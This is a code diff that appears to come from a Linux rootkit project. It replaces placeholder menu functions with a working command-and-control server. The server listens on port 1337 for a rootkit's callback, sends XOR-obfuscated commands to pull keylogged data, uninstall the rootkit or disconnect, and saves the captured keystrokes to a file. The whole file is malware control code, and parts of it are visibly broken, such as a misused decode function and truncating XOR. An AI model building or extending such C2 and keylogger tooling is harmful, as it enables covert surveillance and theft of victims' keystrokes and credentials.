@@ -1,35 +1,31 @@
-# -*- coding: utf-8 -*-
-"""
-Created on Fri Nov  1 12:07:20 2019
+#!/usr/bin/env python3
+import socket
+import enum
+import time
 
-@author: dbrac
+COMMANDS_DICT = {'Collect': '1',
+                 'Uninstall': '2',
+                 'Disconnect': '3'
+                 }
 
-Linux Rootkit Project
+class C2Server:
 
-C2 Command Line Interface
-"""
+    def __init__(self):
+        self.socket             = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.c2_port            = 1337
+        self.key                = b'\xde\xad\xbe\xef'
+        self.conn               = None
+        self.keylog_filepath    = 'keylog_data'
+        self.commands = {
+                         '1': self.collect,
+                         '2': self.uninstall,
+                         '3': self.disconnect
+                         }
 
-def encrypt(message, key):
-    byte_list = [bytes(message[i:i+4]) for i in range(0, len(message)-3, 4)]
-    int_list = [int.from_bytes(byte_list[i]) for i in range(len(byte_list))]
-
-    for i in range(len(int_list)):
-        int_list[i] ^= int.from_bytes(key)
-        byte_list[i] = int_list[i].to_bytes(4)
-
-    return b''.join(byte_list)
-
-def gather():
-    return "This will gather keylogged commands"
-
-def uninstall():
-    return "This will unistall the kernel module"
-
-def shutdown():
-    return "This will shutdown the C2"
-
-def printMenu():
-    print(
+    @staticmethod
+    def menu():
+        user_choice = input(
             """
 ######                                        #     #                      
 #     #  ####   ####  ##### #    # # #####    ##   ## ###### #    # #    #
@@ -39,46 +35,86 @@ def printMenu():
 #    #  #    # #    #   #   #   #  #   #      #     # #      #   ## #    # 
 #     #  ####   ####    #   #    # #   #      #     # ###### #    #  #### 
             
-                        1: Execute Command
-                        2: Collect Data
-                        3: Uninstall
-                        4: Shutdown
-            """
-        )
+                        1: Collect Data
+                        2: Uninstall Rootkit
+                        3: Disconnect C2
+:"""
+            )
+        return user_choice
 
-def convertTLV():
-    return "Converting to TLV..."
+    def serve(self):
+        self.socket.bind(('', self.c2_port))
+        self.socket.listen()
+        print("Waiting for rootkit callback")
+        self.conn, addr = self.socket.accept()
+        print("Received callback from rootkit at address: {0}".format(str(addr)))
+        with self.conn:
+            user_choice = '0'
+            done = 0
+            while not done:
+                while user_choice not in COMMANDS_DICT.values():
+                    user_choice = self.menu()
+                    print(user_choice)
+                self.commands[user_choice]()
+                if user_choice in (COMMANDS_DICT['Uninstall'], COMMANDS_DICT['Disconnect']):
+                    print("DONE")
+                    done = 1
 
-def unconvertTLV():
-    return "Converting from TLV..."
+    def collect(self):
+        collect_byte = b'\x01'
+        rc = self.marshal_and_send(collect_byte, collect_byte)
+        if not rc:
+            print("Error when collecting keylogged data: invalid ACK received...")
+            return rc
+        keylog_data = decode_tlv()
+        print("Keylog data: {0}".format(keylog_data))
+        with open(self.keylog_filepath, 'a') as fp:
+            fp.write(keylog_data)
+        print("Keylog data successfully written to {0}".format(self.keylog_filepath))
+        return True
 
-def encrypt():
-    return "Encrypting the message..."
+    def uninstall(self):
+        print("Sending uninstall command to rootkit...")
+        uninstall_byte = b'\x02'
+        rc = self.marshal_and_send(uninstall_byte, uninstall_byte)
+        if not rc:
+            print("Error when uninstall rootkit: invalid ACK received...")
+            return rc
+        self.disconnect()
+    
+    def disconnect(self):
+        print("Closing connection...")
+        disconnect_byte = b'\x03'
+        rc = self.marshal_and_send(disconnect_byte, disconnect_byte, check_ack=False)
+        self.socket.shutdown(socket.SHUT_RDWR)
+        self.socket.close()
 
-def send():
-    return "Sending data..."
+    def marshal_and_send(self, message, ack_byte, check_ack=True):
+        encrypted_message = self.crypto(message)
+        self.conn.sendall(encrypted_message)
+        if not check_ack:
+            return True
 
-def wait():
-    return "Waiting..."
+        ack = self.crypto(self.conn.recv(1))
+        if ack[0].to_bytes(1, byteorder='big') != ack_byte:
+            print("Error with ack byte. Received: {0}, Expected: {1}".format(ack[0].to_bytes(1, byteorder='big'), ack_byte))
+            return False
+        return True
 
-def saveData():
-    return "Data saved to file: ..."
+    def crypto(self, message):
+        message = bytearray(message)
+        final = bytearray()
+        for i, j in zip(message, self.key):
+            final.append(i ^ j)
+        return final
 
-def numbers_to_menu_options(choice):
-    switcher = {
-            1: execute(),
-            2: gather(),
-            3: uninstall(),
-            4: shutdown(),
-            }
-    func = switcher.get(choice, lambda: "Invalid Choice")
-    print(func)
+    def decode_tlv(self, tlv):
+        length = int.from_bytes(self.conn.recv(4), byteorder='big', signed=False)
+        encrypted_message = self.conn.recv(length)
+        bytes_message = self.crypto(encrypted_message)
+        return bytes_message.encode('utf-8')
 
 
 if __name__ == "__main__":
-    while True:
-        printMenu()    
-        i = int(input("Enter menu choice 1 - 4: "))
-        numbers_to_menu_options(i)
-        if i == 3 or i == 4:
-            break
+    c2 = C2Server()
+    c2.serve()
